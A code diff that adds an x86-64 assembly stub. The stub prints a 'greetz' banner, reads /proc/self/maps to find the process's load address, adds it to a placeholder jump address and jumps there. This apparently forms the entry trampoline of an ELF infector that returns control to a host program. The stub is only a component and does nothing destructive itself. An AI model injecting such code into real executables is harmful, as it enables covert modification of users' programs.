@@ -24,4 +24,117 @@
 
 .globl _start
 
+.equ SYS_read,      0
+.equ SYS_write,     1
+.equ SYS_open,      2
+.equ    MAXLEN,     17
+
+.text
+
+_start:
+    # Save registers
+    push %rax
+    push %rcx
+    push %rdx
+    push %rsi
+    push %rdi
+    push %r11
+
+    # Write out greetz
+    mov $SYS_write, %eax
+    mov $1, %rdi
+    lea msg(%rip), %rsi
+    mov $msglen, %rdx
+    syscall
+
+    xor %rax, %rax
+
+    // Open path in read-only
+    mov $SYS_open, %eax
+    lea path(%rip), %rdi
+    mov $0, %rsi
+    syscall
+
+    // Allocate buffer space
+    subq $16, %rsp
+
+    // Read the first MAXLEN bytes from path
+    mov %rax, %rdi
+    mov $SYS_read, %eax
+    mov %rsp, %rsi
+    mov $MAXLEN, %rdx
+    syscall
+
+    // scan the buffer for the fist '-' character
+scan:
+    mov $MAXLEN, %ecx
+    // store the wildcard in %al byte
+    mov $'-', %al
+    mov %rsp, %rdi
+    cld
+    repne scasb
+    // ECX holds the index
+
+    // Do some ugly gymnastics
+    // moving data around to fix
+    // our counter
+    // FIXME
+    inc %ecx
+    mov %rcx, %r10
+    mov $MAXLEN, %r13
+    sub %r10, %r13
+    mov %r13, %rcx
+
+    // Prepare to read from
+    // result buffer
+    xor %rbx, %rbx
+    mov %rsp, %rsi
+    mov %rsi, %rdi
+    cld
+    // Convert the result buffer
+    // into hex real values
+readchars:
+    lodsb
+    cmpb $0x39, %al
+    jle digit
+alpha:
+    subb $0x57, %al
+    jmp load_ebx
+
+digit:
+    subb $0x30, %al
+
+load_ebx:
+    shl $0x4, %rbx
+    or %rax, %rbx
+    stosb
+    loop readchars
+
+    addq $16, %rsp
+
+    // Load offset on general reg %r8
+    xor %r8, %r8
+    movq %rbx, %r8
+    xor %rbx, %rbx
+
+    // Dummy jump address
+    mov $0x1122334455667788, %rbx
+
+    // Add result offset
+    addq %r8, %rbx
+
+    # Restore
+    pop %r11
+    pop %rdi
+    pop %rsi
+    pop %rdx
+    pop %rcx
+    pop %rax
+
+    // This is it
+    jmp *%rbx
+
+    path:   .asciz "/proc/self/maps"
+    msg:    .asciz "-= Quantum junction get in both lanes =-\n"
+    msglen= .-msg
 
